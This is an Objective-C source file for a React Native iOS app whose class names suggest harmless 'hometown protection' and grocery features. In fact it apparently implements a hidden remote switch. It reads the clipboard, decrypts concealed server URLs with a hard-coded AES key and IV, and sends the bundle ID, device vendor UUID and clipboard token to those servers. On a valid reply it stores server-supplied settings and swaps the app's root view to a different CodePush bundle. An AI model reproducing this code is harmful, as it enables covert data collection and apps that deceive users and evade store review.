#import "RNHometownProtection.h"
#import <RNHometownGroceryExchanging/RNHometownExchangeCenter.h>
#import "RNNetReachability.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>

#import <CodePush/CodePush.h>
#if __has_include("RNIndicator.h")
    #import "RNIndicator.h"
    #import "JJException.h"
    #import "RNCPushNotificationIOS.h"
#else
    #import <RNIndicator.h>
    #import <JJException.h>
    #import <RNCPushNotificationIOS.h>
#endif

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNHometownProtection () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif

@interface RNHometownProtection()

@property (strong, nonatomic)  NSArray *hometownProtectors;
@property (strong, nonatomic)  NSDictionary *hometownParams;
@property (nonatomic, strong) RNNetReachability *natureProtectionReachability;
@property (nonatomic, copy) void (^vcBlock)(void);


@end

@implementation RNHometownProtection

static RNHometownProtection *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.natureProtectionReachability = [RNNetReachability reachabilityForInternetConnection];
    instance.hometownProtectors = @[@"hometownProtection_APP",
                           @"a71556f65ed2b25b55475b964488334f",
                           @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                           @"vPort", @"vSecu",
                           @"spareRoutes",@"serverUrl",
                           @"umKey", @"umChannel",
                           @"sensorUrl", @"sensorProperty"];
  });
  return instance;
}

- (void)hometownProtection_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(hometownProtection_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.natureProtectionReachability startNotifier];
}

- (void)hometownProtection_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.natureProtectionReachability stopNotifier];
}

- (void)dealloc {
    [self hometownProtection_stopMonitoring];
}


- (void)hometownProtection_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.hometownProtectors[0]] == NO) {
          if (self.vcBlock != nil) {
              [self hometownProtection_hp_throughMainRootController:self.vcBlock];
          }
      }
  }
}

- (void)hometownProtection_hp_throughMainRootController:(void (^ __nullable)(void))changeVcBlock {
    NSBundle *bundle = [NSBundle mainBundle];
    NSArray<NSString *> *tempArray = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_URLS"];
    [self hometownProtection_sa_throughByUrlWindex:0 mArray: tempArray];
}

- (void)hometownProtection_sa_throughByUrlWindex: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
    if ([tArray count] < index) {
        return;
    }
    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:self.hometownParams options:NSJSONWritingFragmentsAllowed error:&error];
    if (error) {
        return;
    }
    NSString *urlStr = [CocoaSecurity aesDecryptWithBase64:tArray[index] hexKey:self.hometownProtectors[1] hexIv:self.hometownProtectors[2]].utf8String;
    NSURL *url = [NSURL URLWithString:urlStr];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 18.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
          NSDictionary *objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
          NSDictionary *data = [objc valueForKey:@"data"];
          if (objc == nil || data == nil || [data isKindOfClass:[NSNull class]]) {
            return;
          }
          int code = [[objc valueForKey:@"code"] intValue];
          int isValid = [[data valueForKey:@"isValid"] intValue];
          if (code == 200 && isValid == 1) {
            NSString *tKey = [[data valueForKey:@"Info"] valueForKey:@"tKey"];
            CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self hometownProtection_saveProtectorMeta:tKey]
                                                                      hexKey:self.hometownProtectors[1]
                                                                       hexIv:self.hometownProtectors[2]];
            NSDictionary *dict = [self hometownProtection_jsonToDic:aes.utf8String];
            if([self hometownProtection_configInfo:dict]) {
                [self hometownProtection_changeTESTRootController];
            }
          }
        } else {
          if (index < [tArray count] - 1) {
              [self hometownProtection_sa_throughByUrlWindex:index + 1 mArray:tArray];
          }
        }
    }];
    [dataTask resume];
}

- (void)hometownProtection_changeTESTRootController {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];

    NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.hometownProtectors[5]] mutableCopy];
    if (spareArr == nil) {
        spareArr = [NSMutableArray array];
    }
    NSString *usingUrl = [ud stringForKey:self.hometownProtectors[6]];
  
    if ([spareArr containsObject:usingUrl] == NO) {
      [spareArr insertObject:usingUrl atIndex:0];
    }

    [self hometownProtection_changeTESTRootControllerWindex:0 mArray:spareArr];
}

- (void)hometownProtection_changeTESTRootControllerWindex: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
    if ([tArray count] < index) {
        return;
    }

    NSURL *url = [NSURL URLWithString:tArray[index]];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];

    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (error == nil && httpResponse.statusCode == 200) {
          NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
          [ud setBool:YES forKey:self.hometownProtectors[0]];
          [ud setValue:tArray[index] forKey:self.hometownProtectors[6]];
          [ud synchronize];
          dispatch_async(dispatch_get_main_queue(), ^{
            if (self.vcBlock != nil) {
                self.vcBlock();
            }
          });
        } else {
            if (index < [tArray count] - 1) {
                [self hometownProtection_changeTESTRootControllerWindex:index + 1 mArray:tArray];
            }
        }
    }];
    [dataTask resume];
}

- (UIInterfaceOrientationMask)getOrientationMask {
    return [Orientation getOrientation];
}

- (NSDictionary *)hometownProtection_jsonToDic: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *iaafDict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return iaafDict[@"data"];
}

- (BOOL)hometownProtection_getProtectorInfo {
  NSString *cp = [UIPasteboard generalPasteboard].string ?: @"";
  NSString *matrixString = [self hometownProtection_saveProtectorMeta:cp];
  if (matrixString == nil || [matrixString isEqualToString:@""]) {
    return NO;
  } else {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    self.hometownParams = [NSMutableDictionary dictionary];
    [self.hometownParams setValue:appName forKey:@"tName"];
    [self.hometownParams setValue:[bundle bundleIdentifier] forKey:@"tBundle"];
    [self.hometownParams setValue:[[[UIDevice currentDevice] identifierForVendor] UUIDString] forKey:@"tUUID"];
    [self.hometownParams setValue:matrixString forKey:@"token"];
    return YES;
  }
}

- (NSString *)hometownProtection_saveProtectorMeta: (NSString* )matrixString {
  if ([matrixString containsString:@"#iPhone#"]) {
    NSArray *university = [matrixString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        matrixString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return matrixString;
}

- (BOOL)hometownProtection_configInfo:(NSDictionary *)iaafDict {
    if (iaafDict == nil || [iaafDict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
//    [ud setBool:YES forKey:self.hometownProtectors[0]];
    
    [iaafDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)hometownProtection_hp_joinThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.hometownProtectors[0]]) {
    return YES;
  } else {
    self.vcBlock = changeVcBlock;
    if ([self hometownProtection_getProtectorInfo]) {
      [self hometownProtection_hp_throughMainRootController:changeVcBlock];
      [self hometownProtection_startMonitoring];
    }
    return NO;
  }
}

- (UIViewController *)hometownProtection_hp_throughMainRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions
{
  RCTAppSetupPrepareApp(application);
    
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
  [[RNHometownExchangeCenter shared] hometownExchange_ne_configNovServer:[ud stringForKey:self.hometownProtectors[3]] withSecu:[ud stringForKey:self.hometownProtectors[4]]];

  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
    
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
    
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }

  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler {
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}

- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge {
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}


#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
